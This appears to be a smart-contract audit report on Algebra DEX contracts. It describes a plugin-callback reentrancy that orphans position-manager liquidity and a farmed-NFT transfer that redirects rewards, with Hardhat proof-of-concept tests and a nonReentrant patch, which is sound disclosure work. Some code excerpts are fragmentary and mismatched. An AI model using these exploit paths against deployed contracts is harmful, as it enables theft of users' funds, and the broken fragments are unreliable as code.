+++ b/src/core/contracts/base/ReservesManager.sol
@@ -1,94 +1,96 @@

   function getReserves() external view returns (uint128, uint128) {
     return (reserve0, reserve1);
   }
 
   /// @dev updates reserves data and distributes excess in the form of fee to liquidity providers.
   /// If any of the balances is greater than uint128, the excess is sent to the communityVault
   function _updateReserves() internal returns (uint256 balance0, uint256 balance1) {
     (balance0, balance1) = (_balanceToken0(), _balanceToken1());
     // we do not support tokens with totalSupply > type(uint128).max, so any excess will be sent to communityVault
     // this situation can only occur if the tokens are sent directly to the pool from outside
     // **such excessive tokens will be burned if there is no communityVault connected**

         if (balance0 > type(uint128).max) {
           _transfer(token0, _communityVault, balance0 - type(uint128).max);
           balance0 = type(uint128).max;
         }
         if (balance1 > type(uint128).max) {
           _transfer(token1, _communityVault, balance1 - type(uint128).max);
           balance1 = type(uint128).max;
         }
       }
     }
 
+    (uint128 _reserve0, uint128 _reserve1) = (reserve0, reserve1);
+    if (balance0 < _reserve0 || balance1 < _reserve1) revert arithmeticError();
+

-    (uint128 _reserve0, uint128 _reserve1) = (reserve0, reserve1);

       unchecked {
         if (hasExcessToken0) totalFeeGrowth0Token += FullMath.mulDiv(balance0 - _reserve0, Constants.Q128, _liquidity);
         if (hasExcessToken1) totalFeeGrowth1Token += FullMath.mulDiv(balance1 - _reserve1, Constants.Q128, _liquidity);
         (reserve0, reserve1) = (uint128(balance0), uint128(balance1));
       }
     }
   }
 
   /// @notice Applies deltas to reserves and pays communityFees
   /// @dev Community fee is sent to the vault at a specified frequency or when variables communityFeePending{0,1} overflow
   /// @param deltaR0 Amount of token0 to add/subtract to/from reserve0, must not exceed uint128
   /// @param deltaR1 Amount of token1 to add/subtract to/from reserve1, must not exceed uint128
   /// @param communityFee0 Amount of token0 to pay as communityFee, must not exceed uint128
   /// @param communityFee1 Amount of token1 to pay as communityFee, must not exceed uint128
   function _changeReserves(int256 deltaR0, int256 deltaR1, uint256 communityFee0, uint256 communityFee1) internal {
     if (communityFee0 | communityFee1 != 0) {
       unchecked {
         // overflow is desired since we do not support tokens with totalSupply > type(uint128).max
         uint256 _cfPending0 = uint256(communityFeePending0) + communityFee0;
         uint256 _cfPending1 = uint256(communityFeePending1) + communityFee1;
         uint32 currentTimestamp = _blockTimestamp();
         // underflow in timestamps is desired
         if (
           currentTimestamp - communityFeeLastTimestamp >= Constants.COMMUNITY_FEE_TRANSFER_FREQUENCY ||
           _cfPending0 > type(uint104).max ||
           _cfPending1 > type(uint104).max
         ) {
           address _communityVault = communityVault;
           if (_cfPending0 > 0) _transfer(token0, _communityVault, _cfPending0);
           if (_cfPending1 > 0) _transfer(token1, _communityVault, _cfPending1);
           communityFeeLastTimestamp = currentTimestamp;
           (deltaR0, deltaR1) = (deltaR0 - _cfPending0.toInt256(), deltaR1 - _cfPending1.toInt256());
           (_cfPending0, _cfPending1) = (0, 0);
         }
         // the previous block guarantees that no overflow occurs
         (communityFeePending0, communityFeePending1) = (uint104(_cfPending0), uint104(_cfPending1));
       }

     if (deltaR0 | deltaR1 == 0) return;

     if (deltaR0 != 0) _reserve0 = (uint256(int256(_reserve0) + deltaR0)).toUint128();
     if (deltaR1 != 0) _reserve1 = (uint256(int256(_reserve1) + deltaR1)).toUint128();
     (reserve0, reserve1) = (uint128(_reserve0), uint128(_reserve1));
   }
```

```
  function burn(
    int24 bottomTick,
    int24 topTick,
    uint128 amount,
    bytes calldata data
  ) external override onlyValidTicks(bottomTick, topTick) returns (uint256 amount0, uint256 amount1) {
    if (amount > uint128(type(int128).max)) revert arithmeticError();

    int128 liquidityDelta = -int128(amount);
```

## Description

`decreaseLiquidity` caches `position.liquidity` and calls the pool to burn liquidity before it writes the reduced value back to the NFT record. The pool unlocks and, when enabled, calls the plugin's `afterModifyPosition` hook before the manager resumes its accounting. That callback can reenter `increaseLiquidity`, which lacks `isAuthorizedForToken` and a manager-level reentrancy guard, causing a nested update to the same position. When the outer call resumes, `position.liquidity = positionLiquidity - params.liquidity` overwrites the nested increase based on the stale cached value. Consequently, the manager-owned pool position can retain more liquidity than is represented by any NFT, and associated fee or farming accounting can also become inconsistent.
## Root cause

The manager permits reentrancy through the pool's unlocked `afterModifyPosition` callback while `decreaseLiquidity` retains stale position state, and `increaseLiquidity` can mutate that state without authorization or reentrancy protection.
## Impact

Liquidity added during the callback can remain in the manager-owned aggregate pool position without a corresponding NFT claim, preventing its removal through a live token. Repeated callback-driven mutations can also leave fee snapshots, recorded liquidity, and farming synchronization operating on inconsistent balances.
## Proof of concept
### Test case

```
import { MaxUint256, ZeroAddress } from 'ethers';
import { ethers } from 'hardhat';
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';

import completeFixture from './shared/completeFixture';
import { FeeAmount, TICK_SPACINGS } from './shared/constants';
import { encodePriceSqrt } from './shared/encodePriceSqrt';
import { expect } from './shared/expect';
import { getMaxTick, getMinTick } from './shared/ticks';
import poolAtAddress from './shared/poolAtAddress';

const AFTER_POSITION_MODIFY_FLAG = 1 << 3;

function encodeSignedTick24(tick: number): bigint {
  return BigInt.asUintN(24, BigInt(tick));
}

function positionKey(owner: string, tickLower: number, tickUpper: number): string {
  const packed =
    (BigInt(owner) << 48n) |
    (encodeSignedTick24(tickLower) << 24n) |
    encodeSignedTick24(tickUpper);
  return '0x' + packed.toString(16).padStart(64, '0');
}

describe('PoC: plugin reentrancy orphans position-manager liquidity', function () {
  this.timeout(40_000);

  it('reenters increaseLiquidity from the pool afterModifyPosition hook and leaves pool liquidity with no matching NFT record', async () => {
    const [owner] = await ethers.getSigners();
    const { factory, nft, tokens } = await loadFixture(completeFixture);
    const [token0, token1] = tokens;
    const token0Address = await token0.getAddress();
    const token1Address = await token1.getAddress();
    const nftAddress = await nft.getAddress();

    await token0.approve(nftAddress, MaxUint256);
    await token1.approve(nftAddress, MaxUint256);

    const tickLower = getMinTick(TICK_SPACINGS[FeeAmount.MEDIUM]);
    const tickUpper = getMaxTick(TICK_SPACINGS[FeeAmount.MEDIUM]);

    await nft.createAndInitializePoolIfNecessary(token0Address, token1Address, encodePriceSqrt(1, 1));
    const poolAddress = await factory.poolByPair(token0Address, token1Address);
    expect(poolAddress).to.not.equal(ZeroAddress);
    const pool = poolAtAddress(poolAddress, owner);

    await nft.mint({
      token0: token0Address,
      token1: token1Address,
      deployer: ZeroAddress,
      tickLower,
      tickUpper,
      amount0Desired: 1_000_000n,
      amount1Desired: 1_000_000n,
      amount0Min: 0,
      amount1Min: 0,
      recipient: owner.address,
      deadline: 1,
    });

    const tokenId = 1n;
    const initialPosition = await nft.positions(tokenId);
    const initialNftLiquidity = initialPosition.liquidity;
    expect(initialNftLiquidity).to.be.gt(4n);

    const key = positionKey(nftAddress, tickLower, tickUpper);
    const initialPoolPosition = await pool.positions(key);
    expect(initialPoolPosition.liquidity).to.equal(initialNftLiquidity);

    const plugin = await (await ethers.getContractFactory('ReentrantIncreaseLiquidityPlugin')).deploy(
      nftAddress,
      token0Address,
      token1Address
    );
    const pluginAddress = await plugin.getAddress();

    await token0.transfer(pluginAddress, 1_000_000n);
    await token1.transfer(pluginAddress, 1_000_000n);

    await pool.setPlugin(pluginAddress);
    await pool.setPluginConfig(AFTER_POSITION_MODIFY_FLAG);
    expect((await pool.globalState()).pluginConfig).to.equal(AFTER_POSITION_MODIFY_FLAG);

    await plugin.arm(tokenId, 100_000n, 100_000n, 1);

    const decreaseAmount = initialNftLiquidity / 4n;
    await nft.decreaseLiquidity({
      tokenId,
      liquidity: decreaseAmount,
      amount0Min: 0,
      amount1Min: 0,
      deadline: 1,
    });

    expect(await plugin.reentered()).to.equal(true);
    const nestedLiquidity = await plugin.nestedLiquidity();
    expect(nestedLiquidity).to.be.gt(0n);

    const finalNftPosition = await nft.positions(tokenId);
    const finalPoolPosition = await pool.positions(key);

    // The outer decrease overwrote the nested increase with its stale cached value.
    expect(finalNftPosition.liquidity).to.equal(initialNftLiquidity - decreaseAmount);

    // The actual pool position owned by the manager still includes the reentrant increase.
    expect(finalPoolPosition.liquidity).to.equal(finalNftPosition.liquidity + nestedLiquidity);
    expect(finalPoolPosition.liquidity).to.be.gt(finalNftPosition.liquidity);
  });
});
```

### Considerations

PoC uses a test plugin contract installed through pool-administrator configuration to model a malicious/compromised plugin. It demonstrates the full native Solidity call chain on the periphery Hardhat harness: NonfungiblePositionManager.decreaseLiquidity -> AlgebraPool.burn -> afterModifyPosition plugin callback -> reentrant NonfungiblePositionManager.increaseLiquidity, then asserts that the manager-owned pool position liquidity exceeds the NFT-recorded liquidity by the nested increase amount.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Adds a manager-level reentrancy guard to both increaseLiquidity and decreaseLiquidity, preventing the pool plugin callback during a decrease from entering increaseLiquidity and mutating the NFT position before the outer accounting commit.
### Patch

```diff
 {

         _checkAuthorizationForToken(tokenId);

     /// @inheritdoc INonfungiblePositionManager
     function positions(
         uint256 tokenId
     )
         external
         view
         override
         returns (
             uint88 nonce,
             address operator,
             address token0,
             address token1,
             address deployer,
             int24 tickLower,
             int24 tickUpper,
             uint128 liquidity,
             uint256 feeGrowthInside0LastX128,
             uint256 feeGrowthInside1LastX128,
             uint128 tokensOwed0,
             uint128 tokensOwed1

     {
         Position storage position = _positions[tokenId];
         // single SLOAD
         uint80 poolId = position.poolId;
         tickLower = position.tickLower;
         tickUpper = position.tickUpper;
         liquidity = position.liquidity;
         require(poolId != 0, 'Invalid token ID');
         PoolAddress.PoolKey storage poolKey = _poolIdToPoolKey[poolId];
         return (
             position.nonce,
             position.operator,
             poolKey.token0,
             poolKey.token1,
             poolKey.deployer,
             tickLower,
             tickUpper,
             liquidity,
             position.feeGrowthInside0LastX128,
             position.feeGrowthInside1LastX128,
             position.tokensOwed0,
             position.tokensOwed1
         );
     }
 
     /// @inheritdoc INonfungiblePositionManager
     function mint(
         MintParams calldata params
     )
         external
         payable
         override
         checkDeadline(params.deadline)
         returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1)
     {
         return _mintAlgebraPosition(params);
     }
 
     function _mintAlgebraPosition(
         MintParams memory params
     ) private returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1) {
         IAlgebraPool pool;
         uint128 liquidityDesired;
         (liquidityDesired, liquidity, amount0, amount1, pool) = addLiquidity(
             AddLiquidityParams({
                 token0: params.token0,
                 token1: params.token1,
                 deployer: params.deployer,
                 recipient: address(this),
                 tickLower: params.tickLower,
                 tickUpper: params.tickUpper,
                 amount0Desired: params.amount0Desired,
                 amount1Desired: params.amount1Desired,
                 amount0Min: params.amount0Min,
                 amount1Min: params.amount1Min
             })
         );
         unchecked {
             _mint(params.recipient, (tokenId = _nextId++));
         }
 
         (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool._getPositionInPool(
             address(this),
             params.tickLower,
             params.tickUpper
         );
 
         uint80 poolId = _cachePoolKey(
             address(pool),
             PoolAddress.getPoolKey(params.deployer, params.token0, params.token1)
         );
 
         _positions[tokenId] = Position({
             nonce: 0,
             operator: address(0),
             poolId: poolId,
             tickLower: params.tickLower,
             tickUpper: params.tickUpper,
             liquidity: liquidity,
             feeGrowthInside0LastX128: feeGrowthInside0LastX128,
             feeGrowthInside1LastX128: feeGrowthInside1LastX128,
             tokensOwed0: 0,
             tokensOwed1: 0
         });
 
         emit IncreaseLiquidity(tokenId, liquidityDesired, liquidity, amount0, amount1, address(pool));
     }
 
     /// @dev Caches a pool key
     function _cachePoolKey(address pool, PoolAddress.PoolKey memory poolKey) private returns (uint80 poolId) {
         if ((poolId = _poolIds[pool]) == 0) {
             unchecked {
                 _poolIds[pool] = (poolId = _nextPoolId++);
             }
             _poolIdToPoolKey[poolId] = poolKey;
         }
     }
 
     function _getPoolById(uint80 poolId) private view returns (address) {
         PoolAddress.PoolKey storage poolKey = _poolIdToPoolKey[poolId];
         return PoolAddress.getPool(factory, poolKey);
     }
 
     function _updateUncollectedFees(
         Position storage position,
         IAlgebraPool pool,
         address owner,
         int24 tickLower,
         int24 tickUpper,
         uint128 positionLiquidity
     ) private returns (uint128 tokensOwed0, uint128 tokensOwed1) {

             owner,
             tickLower,
             tickUpper
         );

             tokensOwed0 = uint128(
                 FullMath.mulDiv(
                     feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128,
                     positionLiquidity,
                     Constants.Q128
                 )
             );
             tokensOwed1 = uint128(
                 FullMath.mulDiv(
                     feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128,
                     positionLiquidity,
                     Constants.Q128
                 )
             );
         }
 
         position.feeGrowthInside0LastX128 = feeGrowthInside0LastX128;
         position.feeGrowthInside1LastX128 = feeGrowthInside1LastX128;

     /// @inheritdoc INonfungiblePositionManager
     function increaseLiquidity(
         IncreaseLiquidityParams calldata params
     )
         external
         payable
         override
+        nonReentrant
         checkDeadline(params.deadline)
         returns (uint128 liquidity, uint256 amount0, uint256 amount1)

         Position storage position = _positions[params.tokenId];
 
         PoolAddress.PoolKey storage poolKey = _poolIdToPoolKey[position.poolId];
         int24 tickLower = position.tickLower;
         int24 tickUpper = position.tickUpper;
         uint128 positionLiquidity = position.liquidity;
 
         IAlgebraPool pool;
         uint128 liquidityDesired;
         (liquidityDesired, liquidity, amount0, amount1, pool) = addLiquidity(
             AddLiquidityParams({
                 token0: poolKey.token0,
                 token1: poolKey.token1,
                 deployer: poolKey.deployer,
                 tickLower: tickLower,
                 tickUpper: tickUpper,
                 amount0Desired: params.amount0Desired,
                 amount1Desired: params.amount1Desired,
                 amount0Min: params.amount0Min,
                 amount1Min: params.amount1Min,
                 recipient: address(this)
             })
         );
 
         // this is now updated to the current transaction
         (uint128 tokensOwed0, uint128 tokensOwed1) = _updateUncollectedFees(
             position,
             pool,
             address(this),
             tickLower,
             tickUpper,
             positionLiquidity
         );

             if (tokensOwed0 | tokensOwed1 != 0) {
                 position.tokensOwed0 += tokensOwed0;
                 position.tokensOwed1 += tokensOwed1;

         }
 
         emit IncreaseLiquidity(params.tokenId, liquidityDesired, liquidity, amount0, amount1, address(pool));
 
         _applyLiquidityDeltaInFarming(params.tokenId, int256(uint256(liquidity)));
     }
 
     /// @inheritdoc INonfungiblePositionManager
     function decreaseLiquidity(
         DecreaseLiquidityParams calldata params
     )
         external
         payable
         override
         isAuthorizedForToken(params.tokenId)
+        nonReentrant
         checkDeadline(params.deadline)
         returns (uint256 amount0, uint256 amount1)
     {
         require(params.liquidity > 0);
         Position storage position = _positions[params.tokenId];
 
         (uint80 poolId, int24 tickLower, int24 tickUpper, uint128 positionLiquidity) = (
             position.poolId,
             position.tickLower,
             position.tickUpper,
             position.liquidity
         );
         require(positionLiquidity >= params.liquidity);
 
         IAlgebraPool pool = IAlgebraPool(_getPoolById(poolId));
         (amount0, amount1) = pool._burnPositionInPool(tickLower, tickUpper, params.liquidity);
 
         require(amount0 >= params.amount0Min && amount1 >= params.amount1Min, 'Price slippage check');
 
         // scope to prevent stack-too-deep
         {
             // this is now updated to the current transaction
             (uint128 tokensOwed0, uint128 tokensOwed1) = _updateUncollectedFees(
                 position,
                 pool,
                 address(this),
                 tickLower,
                 tickUpper,
                 positionLiquidity
             );
 
             unchecked {
                 position.tokensOwed0 += uint128(amount0) + tokensOwed0;
                 position.tokensOwed1 += uint128(amount1) + tokensOwed1;
 
                 // subtraction is safe because we checked positionLiquidity is gte params.liquidity
                 position.liquidity = positionLiquidity - params.liquidity;
             }
         }
 
         emit DecreaseLiquidity(params.tokenId, params.liquidity, amount0, amount1);
 
         _applyLiquidityDeltaInFarming(params.tokenId, -int256(uint256(params.liquidity)));
     }
 
     /// @inheritdoc INonfungiblePositionManager
     function collect(
         CollectParams calldata params
     ) external payable override isAuthorizedForToken(params.tokenId) returns (uint256 amount0, uint256 amount1) {
         require(params.amount0Max > 0 || params.amount1Max > 0);
         // allow collecting to the nft position manager address with address 0
         address recipient = params.recipient == address(0) ? address(this) : params.recipient;
 
         Position storage position = _positions[params.tokenId];
         IAlgebraPool pool = IAlgebraPool(_getPoolById(position.poolId));
 
         // trigger an update of the position fees owed and fee growth snapshots if it has any liquidity
         int24 tickLower = position.tickLower;
         int24 tickUpper = position.tickUpper;
         uint128 positionLiquidity = position.liquidity;
 
         (uint128 tokensOwed0, uint128 tokensOwed1) = (position.tokensOwed0, position.tokensOwed1);
         if (positionLiquidity > 0) {
             pool._burnPositionInPool(tickLower, tickUpper, 0);
             (uint128 _tokensOwed0, uint128 _tokensOwed1) = _updateUncollectedFees(
                 position,
                 pool,
                 address(this),
                 tickLower,
                 tickUpper,
                 positionLiquidity
             );
 
             unchecked {
                 tokensOwed0 += _tokensOwed0;
                 tokensOwed1 += _tokensOwed1;
             }
         }
 
         // compute the arguments to give to the pool#collect method
         (uint128 amount0Collect, uint128 amount1Collect) = (
             params.amount0Max > tokensOwed0 ? tokensOwed0 : params.amount0Max,
             params.amount1Max > tokensOwed1 ? tokensOwed1 : params.amount1Max
         );
 
         // the actual amounts collected are returned
         (amount0, amount1) = pool.collect(recipient, tickLower, tickUpper, amount0Collect, amount1Collect);
 
         // sometimes there will be a few less wei than expected due to rounding down in core, but we just subtract the full amount expected
         // instead of the actual amount so we can burn the token
         unchecked {
             (position.tokensOwed0, position.tokensOwed1) = (tokensOwed0 - amount0Collect, tokensOwed1 - amount1Collect);
         }
 
         emit Collect(params.tokenId, recipient, amount0Collect, amount1Collect);
     }
 
     /// @inheritdoc INonfungiblePositionManager
     function burn(uint256 tokenId) external payable override isAuthorizedForToken(tokenId) {
         Position storage position = _positions[tokenId];
         require(position.liquidity | position.tokensOwed0 | position.tokensOwed1 == 0, 'Not cleared');
 
         delete _positions[tokenId];
         delete tokenFarmedIn[tokenId];
         _burn(tokenId);
     }
 
     /// @inheritdoc INonfungiblePositionManager
     function approveForFarming(
         uint256 tokenId,
         bool approve,
         address farmingAddress
     ) external payable override isAuthorizedForToken(tokenId) {
         address newValue;
         if (approve) {
             require(farmingAddress == farmingCenter, 'Invalid farming address');
             newValue = farmingAddress;
         }
         farmingApprovals[tokenId] = newValue;
     }
 
     /// @inheritdoc INonfungiblePositionManager
     function switchFarmingStatus(uint256 tokenId, bool toActive) external override {
         address _farmingCenter = farmingCenter;
         bool accessAllowed = msg.sender == _farmingCenter;
         address newFarmForToken;
         if (toActive) {
             require(farmingApprovals[tokenId] == _farmingCenter, 'Not approved for farming');
             newFarmForToken = _farmingCenter;
         } else {
             // can be switched off by current farming center or by the farming center in which nft is farmed
             accessAllowed = accessAllowed || msg.sender == tokenFarmedIn[tokenId];
         }
         require(accessAllowed, 'Only FarmingCenter');
         tokenFarmedIn[tokenId] = newFarmForToken;
     }
 
     /// @inheritdoc INonfungiblePositionManager
     function setFarmingCenter(address newFarmingCenter) external override {
         require(IAlgebraFactory(factory).hasRoleOrOwner(NONFUNGIBLE_POSITION_MANAGER_ADMINISTRATOR_ROLE, msg.sender));
         farmingCenter = newFarmingCenter;
         emit FarmingCenter(newFarmingCenter);
     }
 
     /// @inheritdoc IERC721Metadata
     function tokenURI(uint256 tokenId) public view override(ERC721, IERC721Metadata) returns (string memory) {
         _requireMinted(tokenId);
         return INonfungibleTokenPositionDescriptor(_tokenDescriptor).tokenURI(this, tokenId);
     }
 
     /// @inheritdoc IERC721
     function getApproved(uint256 tokenId) public view override(ERC721, IERC721) returns (address) {
         _requireMinted(tokenId);
         return _positions[tokenId].operator;
     }
 
     /// @inheritdoc INonfungiblePositionManager
     function isApprovedOrOwner(address spender, uint256 tokenId) external view override returns (bool) {
         _requireMinted(tokenId);
         return _isApprovedOrOwner(spender, tokenId);
     }
 
     function _checkAuthorizationForToken(uint256 tokenId) private view {
         require(_isApprovedOrOwner(msg.sender, tokenId), 'Not approved');
     }
 
     function _applyLiquidityDeltaInFarming(uint256 tokenId, int256 liquidityDelta) private {
         address _tokenFarmedIn = tokenFarmedIn[tokenId];
         if (_tokenFarmedIn == address(0)) return;
 
         address _farmingCenter = farmingCenter;
         if (_farmingCenter == address(0)) return;
 
         if (_tokenFarmedIn == _farmingCenter) {
             // errors without message (i.e. out of gas) will be propagated
             // custom errors will be propagated
             try IPositionFollower(_farmingCenter).applyLiquidityDelta(tokenId, liquidityDelta) {
                 // do nothing
             } catch Panic(uint256) {
                 emit FarmingFailed(tokenId);
             } catch Error(string memory) {
                 emit FarmingFailed(tokenId);
             }
         }
     }
 
     /// @dev Gets the current nonce for a token ID and then increments it, returning the original value
     function _getAndIncrementNonce(uint256 tokenId) internal override returns (uint256) {
         unchecked {
             return uint256(_positions[tokenId].nonce++);
         }
     }
 
     /// @dev Overrides to clear operator and farming approval before any transfer (including burn, but not including mint)
     function _beforeTokenTransfer(address from, address to, uint256 tokenId, uint256 batch) internal override {
         // transfer from address(0) is mint
         if (from != address(0)) {
             // clear approvals
             _positions[tokenId].operator = address(0);
             delete farmingApprovals[tokenId];
         }
         super._beforeTokenTransfer(from, to, tokenId, batch);
     }
 
     /// @dev Overrides _approve to use the operator in the position, which is packed with the position permit nonce
     function _approve(address to, uint256 tokenId) internal override(ERC721) {
         _positions[tokenId].operator = to;
         emit Approval(ownerOf(tokenId), to, tokenId);
     }
 }
```

### `src/farming/contracts/farmings/AlgebraEternalFarming.sol`
#### Lines 290-317 — _Position updates credit calculated rewards to the supplied owner._

```
  function _updatePosition(
    Farm memory farm,
    IncentiveKey memory key,
    bytes32 incentiveId,
    address _owner,
    int128 liquidityDelta
  ) internal returns (uint256 reward, uint256 bonusReward) {
    Incentive storage incentive = incentives[incentiveId];
    IAlgebraEternalVirtualPool virtualPool = IAlgebraEternalVirtualPool(incentive.virtualPoolAddress);

    // pool can "detach" by itself or manually
    int24 tick = _isIncentiveDeactivated(incentive) ? virtualPool.globalTick() : _getTickInPoolAndCheckLock(key.pool);

    // update rewards, as ticks may be cleared when liquidity decreases
    _distributeRewards(virtualPool);

    (reward, bonusReward, , ) = _getNewRewardsForFarm(virtualPool, farm);

    // liquidityDelta will be nonzero.
    // If a desynchronization occurs and the current tick in the pool is incorrect from the point of view of the virtual pool,
    // the virtual pool will be deactivated automatically
    _updatePositionInVirtualPool(address(virtualPool), farm.tickLower, farm.tickUpper, liquidityDelta, tick);

    mapping(IERC20Minimal => uint256) storage rewardBalances = rewards[_owner];
    unchecked {
      if (reward != 0) rewardBalances[key.rewardToken] += reward; // user must claim before overflow
      if (bonusReward != 0) rewardBalances[key.bonusRewardToken] += bonusReward; // user must claim before overflow
    }
```
## Description

An actively farmed NFT can be transferred because `_beforeTokenTransfer` clears `farmingApprovals[tokenId]` but does not clear or settle `tokenFarmedIn[tokenId]` and the associated active deposit. The farming center derives the reward recipient at settlement from `ownerOf(tokenId)`, including during exits and liquidity updates, so rewards accrued before the transfer can be credited to the recipient rather than the prior holder. The recipient can also collect rewards through the center using the current NFT ownership, despite not being the holder while those rewards accrued. Meanwhile, the recorded pre-transfer farming center remains authorized to deactivate the transferred NFT's farming status through `switchFarmingStatus`. Enforce an explicit transfer policy for active farms—such as rejecting transfers until farming is exited and rewards are settled, or atomically settling and cleanly transferring all farm state under an intentional ownership-transfer design.
## Root cause

Active farming state in `tokenFarmedIn` and the center deposit survives NFT transfers while reward settlement uses the mutable `ownerOf(tokenId)` value.
## Impact

A recipient of an actively farmed NFT can realize pending rewards that accrued to the previous holder when an exit, liquidity update, or collection settles the position. The transferred NFT also remains tied to a farming center not approved by its new owner, allowing that center to deactivate its recorded farming status and leaving ownership and farming control inconsistent.
## Proof of concept
### Test case

```
import { loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { ethers } from 'hardhat';
import { Wallet, ZeroAddress } from 'ethers';

import { algebraFixture, AlgebraFixtureType, BNe18, expect, FeeAmount, getMaxTick, getMinTick, maxGas, TICK_SPACINGS } from './shared';
import { ActorFixture } from './shared/actors';
import { provider } from './shared/provider';
import { createTimeMachine } from './shared/time';
import { HelperCommands } from './helpers';

describe('PoC: active farm transfer redirects accrued rewards', () => {
  const Time = createTimeMachine();

  async function activeFarmFixture(): Promise<{
    context: AlgebraFixtureType;
    priorOwner: Wallet;
    recipient: Wallet;
    tokenId: string;
    farmIncentiveKey: { rewardToken: string; bonusRewardToken: string; pool: string; nonce: number };
  }> {
    const context = await algebraFixture();
    const wallets = (await ethers.getSigners()) as any as Wallet[];
    const actors = new ActorFixture(wallets, provider);
    const helpers = HelperCommands.fromTestContext(context, actors, provider);
    const priorOwner = actors.lpUser0();
    const recipient = actors.lpUser1();

    await helpers.createIncentiveFlow({
      rewardToken: context.rewardToken,
      bonusRewardToken: context.bonusRewardToken,
      totalReward: BNe18(100),
      bonusReward: BNe18(100),
      poolAddress: await context.poolObj.getAddress(),
      nonce: 0n,
      rewardRate: 100n,
      bonusRewardRate: 50n,
    });

    const farmIncentiveKey = {
      rewardToken: await context.rewardToken.getAddress(),
      bonusRewardToken: await context.bonusRewardToken.getAddress(),
      pool: context.pool01,
      nonce: 0,
    };

    const deposit = await helpers.mintDepositFarmFlow({
      lp: priorOwner,
      tokensToFarm: [context.token0, context.token1],
      ticks: [getMinTick(TICK_SPACINGS[FeeAmount.MEDIUM]), getMaxTick(TICK_SPACINGS[FeeAmount.MEDIUM])],
      amountsToFarm: [BNe18(10), BNe18(10)],
      createIncentiveResult: {
        rewardToken: context.rewardToken,
        bonusRewardToken: context.bonusRewardToken,
        totalReward: BNe18(100),
        bonusReward: BNe18(100),
        poolAddress: await context.poolObj.getAddress(),
        nonce: 0n,
      },
    });

    return { context, priorOwner, recipient, tokenId: deposit.tokenId, farmIncentiveKey };
  }

  it('lets the transferee settle and claim rewards accrued while the transferor owned the farmed NFT', async () => {
    const { context, priorOwner, recipient, tokenId, farmIncentiveKey } = await loadFixture(activeFarmFixture);
    const oldFarmingCenterAddress = await context.farmingCenter.getAddress();

    expect(await context.nft.ownerOf(tokenId)).to.equal(priorOwner.address);
    expect(await context.nft.tokenFarmedIn(tokenId)).to.equal(oldFarmingCenterAddress);
    expect(await context.farmingCenter.deposits(tokenId)).to.not.equal(ethers.ZeroHash);

    await Time.step(1_000);
    const pendingBeforeTransfer = await context.eternalFarming.getRewardInfo(farmIncentiveKey, tokenId);
    expect(pendingBeforeTransfer.reward).to.be.gt(0n);

    await context.nft.connect(priorOwner).transferFrom(priorOwner.address, recipient.address, tokenId);

    expect(await context.nft.ownerOf(tokenId)).to.equal(recipient.address);
    expect(await context.nft.farmingApprovals(tokenId)).to.equal(ZeroAddress);
    expect(await context.nft.tokenFarmedIn(tokenId)).to.equal(oldFarmingCenterAddress);
    await expect(context.nft.connect(recipient).switchFarmingStatus(tokenId, false)).to.be.revertedWith('Only FarmingCenter');

    expect(await context.eternalFarming.rewards(priorOwner.address, context.rewardToken)).to.equal(0n);
    expect(await context.eternalFarming.rewards(recipient.address, context.rewardToken)).to.equal(0n);

    await context.farmingCenter.connect(recipient).collectRewards(farmIncentiveKey, tokenId, maxGas);

    const redirectedReward = await context.eternalFarming.rewards(recipient.address, context.rewardToken);
    expect(redirectedReward).to.be.gt(0n);
    expect(await context.eternalFarming.rewards(priorOwner.address, context.rewardToken)).to.equal(0n);

    const recipientBalanceBeforeClaim = await context.rewardToken.balanceOf(recipient.address);
    await context.farmingCenter.connect(recipient).claimReward(context.rewardToken, recipient.address, 0n);
    expect(await context.rewardToken.balanceOf(recipient.address)).to.equal(recipientBalanceBeforeClaim + redirectedReward);
    expect(await context.eternalFarming.rewards(recipient.address, context.rewardToken)).to.equal(0n);

    const replacementCenterFactory = await ethers.getContractFactory('FarmingCenter', context.ownerSigner);
    const replacementCenter = await replacementCenterFactory.deploy(context.eternalFarming, context.nft);
    await context.nft.connect(context.ownerSigner).setFarmingCenter(replacementCenter);
    expect(await context.nft.farmingCenter()).to.equal(await replacementCenter.getAddress());
    expect(await context.nft.tokenFarmedIn(tokenId)).to.equal(oldFarmingCenterAddress);

    await context.farmingCenter.connect(recipient).exitFarming(farmIncentiveKey, tokenId, maxGas);
    expect(await context.nft.tokenFarmedIn(tokenId)).to.equal(ZeroAddress);
    expect(await context.farmingCenter.deposits(tokenId)).to.equal(ethers.ZeroHash);
  });
});
```
